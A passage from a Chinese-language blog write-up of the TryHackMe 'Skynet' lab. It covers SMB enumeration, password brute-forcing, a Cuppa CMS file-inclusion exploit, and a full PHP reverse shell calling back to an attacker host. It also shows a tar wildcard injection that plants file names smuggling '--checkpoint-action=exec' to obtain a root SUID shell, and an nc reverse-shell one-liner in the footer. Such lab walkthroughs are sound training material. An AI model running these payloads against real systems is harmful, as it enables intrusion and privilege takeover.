&lt;none&gt;</span><br><span class="line">|     Current user access: &lt;none&gt;</span><br><span class="line">|   \\10.10.220.42\print$: </span><br><span class="line">|     Type: STYPE_DISKTREE</span><br><span class="line">|     Comment: Printer Drivers</span><br><span class="line">|     Users: 0</span><br><span class="line">|     Max Users: &lt;unlimited&gt;</span><br><span class="line">|     Path: C:\var\lib\samba\printers</span><br><span class="line">|     Anonymous access: &lt;none&gt;</span><br><span class="line">|_    Current user access: &lt;none&gt;</span><br><span class="line">|_smb-enum-users: ERROR: Script execution failed (use -d to debug)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 43.82 seconds</span><br></pre></td></tr></table></figure>
+
+<p>枚举到了多个共享结果，如下：</p>
+<table>
+<thead>
+<tr>
+<th>共享名</th>
+<th>匿名访问</th>
+<th>权限</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>​<code>IPC$</code></td>
+<td>✅</td>
+<td>READ&#x2F;WRITE</td>
+<td>IPC 管道服务（一般用于远程通信）</td>
+</tr>
+<tr>
+<td>​<code>anonymous</code></td>
+<td>✅</td>
+<td>READ&#x2F;WRITE</td>
+<td>匿名共享，可能有重要文件</td>
+</tr>
+<tr>
+<td>​<code>milesdyson</code></td>
+<td>❌</td>
+<td>无</td>
+<td>有可能是目标用户的私有目录</td>
+</tr>
+<tr>
+<td>​<code>print$</code></td>
+<td>❌</td>
+<td>无</td>
+<td>打印驱动共享</td>
+</tr>
+</tbody></table>
+<p>下一步，访问<code>anonymous </code>共享目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 smbclient //10.10.5.178/anonymous</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106125220.png" alt="image"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106125223.png" alt="image"></p>
+<p>得到attaction.txt</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.</span><br><span class="line">-Miles Dyson</span><br></pre></td></tr></table></figure>
+
+<p>logs中只有log1.txt文件大小不为0，get下来分析。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106125230.png" alt="image"></p>
+<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>可能为<code>http://10.10.5.178/squirrelmail/src/login.php</code>的密码，做成字典，用bp爆破。账号为：milesdyson</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106124740.png" alt="image"></p>
+<p>得到账密：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">milesdyson</span><br><span class="line">cyborg007haloterminator</span><br></pre></td></tr></table></figure>
+
+<p>成功登录，发现三封邮件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106124723.png" alt="image"></p>
+<p>得到samba的password</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/image-20250414221531-ebgy1sl.png" alt="image"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">)s&#123;A&amp;2Z=F^n_E.B`</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h2 id="访问-milesdyson-共享"><a href="#访问-milesdyson-共享" class="headerlink" title="访问 milesdyson 共享"></a>访问 milesdyson 共享</h2><p>尝试使用用户名 milesdyson 和新密码访问 milesdyson 共享</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 大写的U</span></span><br><span class="line">proxychains4 smbclient -U milesdyson  //10.10.57.199/milesdyson </span><br></pre></td></tr></table></figure>
+
+<p>成功登录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106125209.png" alt="image"></p>
+<p>批量下载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">prompt OFF  <span class="comment"># 关闭交互提示</span></span><br><span class="line">mget *.pdf <span class="comment"># 批量下载后缀为pdf的文件</span></span><br><span class="line"><span class="comment"># 下载整个目录</span></span><br><span class="line">tarmode full</span><br><span class="line">recurse ON</span><br><span class="line">prompt OFF</span><br><span class="line">mget notes</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106125231.png" alt="image"></p>
+<p>​<code>important.txt</code>文件</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. Add features to beta CMS /45kra24zxs28v3yd</span><br><span class="line">2. Work on T-800 Model 101 blueprints</span><br><span class="line">3. Spend more time with my wife</span><br></pre></td></tr></table></figure>
+
+<p>访问该路由<code>/45kra24zxs28v3yd</code>，这就是问题 “What is the hidden directory？”的答案</p>
+<p>‍</p>
+<h2 id="cuppacms-nday"><a href="#cuppacms-nday" class="headerlink" title="cuppacms nday"></a>cuppacms nday</h2><p>然后再次信息收集，gobuster扫目录，发现<code>/administrator</code>路由</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130243.png" alt="image"></p>
+<p>是一个名为<code>cuppa</code>的cms</p>
+<blockquote>
+<p>Searchsploit 是一个用于 exploit-db.com 的命令行搜索工具。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索</span></span><br><span class="line">searchsploit cuppa</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找文件路径</span></span><br><span class="line">locate php/webapps/25971.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130245.png" alt="image"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/image-20250415154647-50pus2g.png" alt="image"></p>
+<p>看完漏洞利用后改payload，可以读取文件了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106125537.png" alt="image"></p>
+<p>打ssrf组合洞</p>
+<p>开启监听，开一个文件下载器，<code>shell1.php</code>如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// php-reverse-shell - A Reverse Shell implementation <span class="keyword">in</span> PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</span><br><span class="line">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="line"></span><br><span class="line">set_time_limit (0);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;ip&#x27;</span>;</span><br><span class="line"><span class="variable">$port</span> = 8888;</span><br><span class="line"><span class="variable">$chunk_size</span> = 1400;</span><br><span class="line"><span class="variable">$write_a</span> = null;</span><br><span class="line"><span class="variable">$error_a</span> = null;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/bash -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = 0;</span><br><span class="line"><span class="variable">$debug</span> = 0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (function_exists(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">	<span class="variable">$pid</span> = pcntl_fork();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$pid</span> == -1) &#123;</span><br><span class="line">		printit(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(0);  // Parent exits</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (posix_setsid() == -1) &#123;</span><br><span class="line">		printit(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$daemon</span> = 1;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	printit(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">umask</span>(0);</span><br><span class="line"></span><br><span class="line">// Open reverse connection</span><br><span class="line"><span class="variable">$sock</span> = fsockopen(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">	printit(<span class="string">&quot;<span class="variable">$errstr</span> (<span class="variable">$errno</span>)&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$descriptorspec</span> = array(</span><br><span class="line">   0 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  // stdin is a pipe that the child will <span class="built_in">read</span> from</span><br><span class="line">   1 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  // stdout is a pipe that the child will write to</span><br><span class="line">   2 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   // stderr is a pipe that the child will write to</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = proc_open(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_resource(<span class="variable">$process</span>)) &#123;</span><br><span class="line">	printit(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stream_set_blocking(<span class="variable">$pipes</span>[0], 0);</span><br><span class="line">stream_set_blocking(<span class="variable">$pipes</span>[1], 0);</span><br><span class="line">stream_set_blocking(<span class="variable">$pipes</span>[2], 0);</span><br><span class="line">stream_set_blocking(<span class="variable">$sock</span>, 0);</span><br><span class="line"></span><br><span class="line">printit(<span class="string">&quot;Successfully opened reverse shell to <span class="variable">$ip</span>:<span class="variable">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (1) &#123;</span><br><span class="line">	<span class="keyword">if</span> (feof(<span class="variable">$sock</span>)) &#123;</span><br><span class="line">		printit(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line">		<span class="built_in">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (feof(<span class="variable">$pipes</span>[1])) &#123;</span><br><span class="line">		printit(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line">		<span class="built_in">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$read_a</span> = array(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[1], <span class="variable">$pipes</span>[2]);</span><br><span class="line">	<span class="variable">$num_changed_sockets</span> = stream_select(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, null);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (in_array(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">		<span class="variable">$input</span> = fread(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;SOCK: <span class="variable">$input</span>&quot;</span>);</span><br><span class="line">		fwrite(<span class="variable">$pipes</span>[0], <span class="variable">$input</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (in_array(<span class="variable">$pipes</span>[1], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line">		<span class="variable">$input</span> = fread(<span class="variable">$pipes</span>[1], <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDOUT: <span class="variable">$input</span>&quot;</span>);</span><br><span class="line">		fwrite(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (in_array(<span class="variable">$pipes</span>[2], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">		<span class="variable">$input</span> = fread(<span class="variable">$pipes</span>[2], <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) printit(<span class="string">&quot;STDERR: <span class="variable">$input</span>&quot;</span>);</span><br><span class="line">		fwrite(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(<span class="variable">$sock</span>);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[0]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[1]);</span><br><span class="line">fclose(<span class="variable">$pipes</span>[2]);</span><br><span class="line">proc_close(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> printit (<span class="variable">$string</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;<span class="variable">$string</span>\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://127.0.0.1:58788/assets/image-20250415164354-uijcbxm.png" alt="image"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130247.png" alt="image"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130248.png" alt="image"></p>
+<p>获取user flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130249.png" alt="image"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>suid提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">www-data@skynet:/$ find / -user root -perm /4000 2&gt;/dev/null</span><br><span class="line">find / -user root -perm /4000 2&gt;/dev/null</span><br><span class="line">/sbin/mount.cifs</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping6</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br></pre></td></tr></table></figure>
+
+<p>没什么收获</p>
+<p>查看定时任务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">www-data@skynet:/$ <span class="built_in">cat</span> /etc/crontab</span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># m h dom mon dow user  command</span></span><br><span class="line">*/1 *   * * *   root    /home/milesdyson/backups/backup.sh</span><br><span class="line">17 *    * * *   root    <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6    * * *   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6    * * 7   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 6    1 * *   root    <span class="built_in">test</span> -x /usr/sbin/anacron || ( <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现<code>/home/milesdyson/backups/backup.sh</code>​是以root权限运行的，查看<code>backup.sh</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@skynet:/home/milesdyson/backups$ <span class="built_in">cat</span> backup.sh</span><br><span class="line"><span class="built_in">cat</span> backup.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line">tar cf /home/milesdyson/backups/backup.tgz *</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/tar/">tar | GTFOBins</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106124708.png" alt="image"></p>
+<p>当定时任务触发后，使用了通配符*对整个文件夹进行打包，系统真正执行打包时，将目录下的文件一个一个传参给通配符执行打包操作，而在打包<code>–checkpoint=1</code>​和<code>–checkpoint-action=exec=sh test.sh</code>时相当于执行如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar cf /home/milesdyson/backups/backup.tgz --checkpoint=1 --checkpoint-action=exec=sh test.sh</span><br></pre></td></tr></table></figure>
+
+<p>而–checkpoint和–checkpoint-action正好时tar的参数，此处会被当作参数执行而非文件名打包。–checkpoint-action=exec=sh test.sh为执行test.sh文件，test.sh文件内容为复制bash到tmp目录并赋予suid，即可达到提权的目的</p>
+<p>在<code>/var/www/html</code>​目录下写<code>test.sh</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 /bin/bash 复制到 /tmp/rootbash 并设置 SUID 位</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash&quot;</span> &gt; test.sh</span><br></pre></td></tr></table></figure>
+
+<p>然后创建两个恶意文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> <span class="string">&quot;/var/www/html/--checkpoint=1&quot;</span></span><br><span class="line"><span class="built_in">touch</span> <span class="string">&quot;/var/www/html/--checkpoint-action=exec=sh test.sh&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>等待 cron 执行，定时任务结束后，尝试执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/rootbash -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/symya/MyPic@main/2025/20260106130250.png" alt="image"></p>
+<p>‍</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://symya.github.io">symv1a</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://symya.github.io/post/skynet-z1e39th.html">https://symya.github.io/post/skynet-z1e39th.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6/">打靶</a><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><a class="post-meta__tags" href="/tags/TryHackMe/">TryHackMe</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/post/kenobi-z1xnvhq.html" title="THM - Offensive Pentesting - Section - Kenobi"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">THM - Offensive Pentesting - Section - Kenobi</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section - Kenobi此房间将涵盖访问 Samba 共享、纵易受攻击的 proftpd 版本以获得初始访问权限，并通过 SUID 二进制文件将您的权限升级到 root。有关利用 Linux 计算机的演练。枚举 Samba 的共享，作易受攻击的 proftpd 版本，并通过路径变量作提升您的权限。 ‍ nmap 扫描 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475nmap -sV -sC -p- --min-rate 10000 10.10.166.21Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-07 09:40 EDTNmap scan report for 10.10.166.21Host is up (0.24s...</div></div></div></a><a class="pagination-related" href="/post/overpass-2-hacked-1pfl8c.html" title="THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked Overpass 被黑了！SOC团队（Paradox，恭喜升级）在深夜值班时查看 shibes 时发现了可疑活动，并成功捕获了攻击发生时的数据包。 您能弄清楚攻击者是如何入侵的，并重新入侵 Overpass 的生产服务器吗？  他们用来上传反向 shell 的页面 URL 是什么？流量包中可以看到是development  ‍ payload 1&lt;?php exec(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f&quot;)?&gt;  密码在tcp流3中  发现使用了ssh-backdoor  1git clone...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/post/kenobi-z1xnvhq.html" title="THM - Offensive Pentesting - Section - Kenobi"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-07</div><div class="info-item-2">THM - Offensive Pentesting - Section - Kenobi</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section - Kenobi此房间将涵盖访问 Samba 共享、纵易受攻击的 proftpd 版本以获得初始访问权限，并通过 SUID 二进制文件将您的权限升级到 root。有关利用 Linux 计算机的演练。枚举 Samba 的共享，作易受攻击的 proftpd 版本，并通过路径变量作提升您的权限。 ‍ nmap 扫描 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475nmap -sV -sC -p- --min-rate 10000 10.10.166.21Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-07 09:40 EDTNmap scan report for 10.10.166.21Host is up (0.24s...</div></div></div></a><a class="pagination-related" href="/post/overpass-2-hacked-1pfl8c.html" title="THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-18</div><div class="info-item-2">THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked</div></div><div class="info-2"><div class="info-item-1">THM - Offensive Pentesting - Section2 - Overpass 2 - 